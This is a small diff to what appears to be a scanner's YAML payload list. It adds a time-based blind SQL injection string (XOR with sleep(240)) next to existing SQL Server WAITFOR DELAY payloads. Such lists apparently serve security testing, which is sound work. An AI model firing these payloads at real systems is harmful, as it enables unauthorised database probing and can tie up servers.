@@ -72,6 +72,8 @@ payloads:
   - >-
     'xor(if(now()=sysdate(),sleep(240),0))or'
   - >-
+    "XOR(if(now()=sysdate(),sleep(240),0))XOR"Z
+  - >-
     '; WAITFOR DELAY '0:0:240'--V
   - >-
     ' WAITFOR DELAY '0:0:240'--V
